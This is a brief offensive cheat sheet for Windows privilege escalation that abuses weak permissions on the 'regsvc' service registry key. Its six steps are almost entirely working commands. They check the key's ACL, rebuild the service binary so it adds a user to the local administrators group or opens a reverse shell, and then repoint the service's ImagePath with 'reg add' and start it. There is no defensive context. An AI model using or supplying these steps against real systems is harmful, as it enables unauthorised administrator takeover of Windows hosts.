# Steps:

#### 1: Get-Acl -Path hklm:\system\CurrentControlSet\Services\regsvc | fl

#### 2: Check permissions of "NT AUTHORITY\INTERACTIVE" and "Everyone" if they have full file access or something similar.

#### 3: Copy the service to attacking machine.

#### 4: Change the system() function to insert command: "cmd.exe /k net localgroup administrators USER /add" or a reverse shell payload.

#### 5: Compile with x86_64-w64-mingw32-gcc then copy to target.

#### 6: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f then sc start regsvc
